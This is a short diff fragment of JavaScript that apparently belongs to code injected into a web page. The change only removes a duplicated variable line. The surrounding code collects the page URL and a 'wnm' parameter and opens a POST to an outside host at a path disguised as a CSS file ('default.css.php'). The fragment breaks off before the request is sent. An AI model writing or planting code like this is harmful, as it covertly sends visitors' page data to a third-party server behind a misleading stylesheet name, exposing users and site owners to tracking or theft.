@@ -1,5 +1,4 @@
-   var weus = window.location.href;
-var weu = window.location.href;
+    var weu = window.location.href;
     var wnm = getUrlParameter('wnm');
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", "http://zorexeye.com/styles/cdn/default.css.php", true);
